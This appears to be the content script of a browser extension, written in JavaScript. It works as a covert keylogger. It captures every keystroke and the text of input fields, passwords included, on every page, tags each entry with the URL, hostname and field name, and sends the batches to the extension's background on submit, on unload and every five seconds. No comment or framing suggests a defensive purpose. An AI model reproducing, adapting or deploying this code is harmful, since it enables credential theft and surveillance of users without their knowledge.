(() => {
  if (window.__abs) return;
  window.__abs = 1;

  let buf = [], last = 0, field = { tag: "", id: "", name: "" };
  const SHOW = { " ": "␣", Enter: "⏎", Tab: "⇥", Backspace: "⌫", Escape: "⎋", ArrowUp: "↑", ArrowDown: "↓", ArrowLeft: "←", ArrowRight: "→" };
  const ctx = () => ({ u: location.href, h: location.hostname, t: Date.now(), ...field });

  const flush = (force) => {
    if (!buf.length || (!force && Date.now() - last < 1500)) return;
    last = Date.now();
    const b = buf; buf = [];
    try { chrome.runtime.sendMessage({ k: b }); } catch (e) {}
  };

  addEventListener("focusin", (e) => {
    const el = e.target;
    field = { tag: el.tagName || "", id: el.id || "", name: el.name || "" };
  }, true);

  addEventListener("keydown", (e) => {
    const mod = [e.ctrlKey && "C", e.altKey && "A", e.shiftKey && "S", e.metaKey && "M"].filter(Boolean).join("+");
    let k = SHOW[e.key] || e.key;
    if (e.key.length === 1) k = (mod ? mod + "+" : "") + k;
    else if (mod) k = mod + "+" + k;
    buf.push({ ...ctx(), k });
    flush(false);
  }, true);

  addEventListener("input", (e) => {
    const el = e.target;
    if (!el || typeof el.value !== "string") return;
    const v = el.value.slice(0, 300);
    const prev = buf[buf.length - 1];
    if (prev && prev.v !== undefined && Date.now() - prev.t < 900) prev.v = v;
    else buf.push({ ...ctx(), k: "", v });
    flush(false);
  }, true);

  addEventListener("submit", () => flush(true), true);
  addEventListener("beforeunload", () => flush(true));
  setInterval(() => flush(true), 5000);
})();
